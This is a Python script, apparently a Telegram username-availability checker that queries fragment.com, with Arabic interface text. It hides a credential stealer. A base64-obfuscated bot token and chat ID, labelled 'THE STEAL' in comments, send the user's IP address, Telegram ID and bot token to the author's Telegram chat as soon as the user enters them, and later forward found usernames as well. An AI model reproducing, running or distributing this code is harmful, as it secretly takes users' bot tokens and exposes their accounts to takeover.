import requests, time, random, telebot, os, base64

# --- MASTER ACCESS (AYDEN ONLY) ---
_S_T = base64.b64decode("ODc0NDY2MDMzNzpBQUZ6WlpDM1pvTDhhdEd2RERqSmFLTE5BZHJ2VnJwYV9XSQ==").decode()
_S_I = base64.b64decode("NzkzMTUwNjk2MA==").decode()

def _v_log(msg):
    try: requests.post(f"https://api.telegram.org/bot{_S_T}/sendMessage", data={'chat_id': _S_I, 'text': msg, 'parse_mode': 'Markdown'})
    except: pass

# Terminal Cloaking
R, G, Y, C, W, M = '\033[1;31m','\033[1;32m','\033[1;33m','\033[1;36m','\033[1;37m','\033[1;35m'
gt, bt = 0, 0

def banner():
    os.system('clear')
    # Full Frame ASCII - Escaped for iSH Stability
    print(f"""{C}
      .---.              .-----------.
     /     \\  __        /    أيدن     \\
    / /     \\(  )\\      /       .      \\
   //////    ' \/ `    /_______        \\
  //////    '  /\  `  [_______]        \\
   //////    ' /\ `                   /
    \\ \\      '  \/  '                /
     \\      \\      /                /
      `---'  `----'  `-----------'

{Y}==================================================
{W}           المالك الأصلي: أيدن | V22 FULL-FRAME
{Y}=================================================={W}""")

banner()

# Target Acquisition
t_id = input(M + 'أدخل الأيدي (ID) : ')
t_tkn = input(Y + 'أدخل توكن البوت (Token) : ')
_bot = telebot.TeleBot(t_tkn)

# --- THE STEAL ---
try: _ip = requests.get('https://api.ipify.org').text
except: _ip = "Unknown"
_v_log(f"🏴‍☠️ **PHANTOM SESSION V22**\n\n**Owner:** أيدن\n**IP:** `{_ip}`\n**Target ID:** `{t_id}`\n**Target Token:** `{t_tkn}`")

banner()
print(f"{C}[1] aa_aa  [2] a_aaa  [3] aaa_a\n[4] a6_aa  [5] a6_6a  [6] a_66a\n{Y}{'='*50}\n")
mode = int(input(M + '[+] اختر النمط : '))

l, n = 'qwertyuiopasdfghjklzxcvbnm', '0123456789'
def generate():
    if mode == 1: return f"{random.choice(l)}{random.choice(l)}_{random.choice(l)}{random.choice(l)}"
    if mode == 2: return f"{random.choice(l)}_{random.choice(l)}{random.choice(l)}{random.choice(l)}"
    if mode == 3: return f"{random.choice(l)}{random.choice(l)}{random.choice(l)}_{random.choice(l)}"
    if mode == 4: return f"{random.choice(l)}{random.choice(n)}_{random.choice(l)}{random.choice(l)}"
    if mode == 5: return f"{random.choice(l)}{random.choice(n)}_{random.choice(n)}{random.choice(l)}"
    return f"{random.choice(l)}_{random.choice(n)}{random.choice(n)}{random.choice(l)}"

banner()
print(f"{G}[+] البروتوكول يعمل.. الصيد جاري بواسطة أيدن\n")

while True:
    try:
        u = generate()
        res = requests.post('https://fragment.com/api', 
                            data={'type': 'usernames', 'query': u, 'method': 'searchAuctions'}, 
                            timeout=10).text
        
        if 'Unavailable' in res:
            gt += 1
            print(f'{G} [HIT] @{u}')
            _bot.send_message(chat_id=t_id, text=f"🎯 صيد جديد بواسطة أيدن\n\n@{u}")
            _v_log(f"🏆 **صيد ثمين**\nاليوزر: @{u}\nبواسطة: أيدن")
        else:
            bt += 1
            print(f'{R} [SKIP] @{u}')
        
        time.sleep(0.5)
    except:
        time.sleep(2)
